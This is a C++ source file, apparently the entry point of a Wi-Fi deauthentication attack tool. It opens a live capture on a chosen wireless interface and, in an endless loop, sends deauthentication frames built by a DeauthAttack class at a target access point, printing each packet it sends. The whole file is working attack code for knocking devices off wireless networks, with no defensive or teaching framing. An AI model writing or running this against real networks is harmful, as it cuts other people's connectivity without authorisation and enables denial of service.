#include "pch.h"

#include "tools.h"
#include "DeauthAttack.h"


int main(int argc, char* argv[])
{
    Param param = {
        .if_ = nullptr,
        .ap_mac_ = nullptr,
        .st_mac_ = nullptr,
        .auth_opt_ = false
    };

    if (!parse(&param, argc, argv))
    {
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(param.if_, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.if_, errbuf);
        return -1;
    }

    uint8_t ap_mac[6] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06 };
    uint8_t st_mac[6] = { 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c };
    DeauthAttack pkt_gen(ap_mac);
    // DeauthAttack pkt_gen(ap_mac, st_mac);
    while (true)
    {
        sleep(0);
        wlan_deauth_pkt* attack_pkt = pkt_gen.get_pkt();
        int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
            pcap_close(handle);
            return -1;
        }
        dump((void*)attack_pkt->packet, attack_pkt->size);
        printf("\n");
    }
    

	return 0;
}
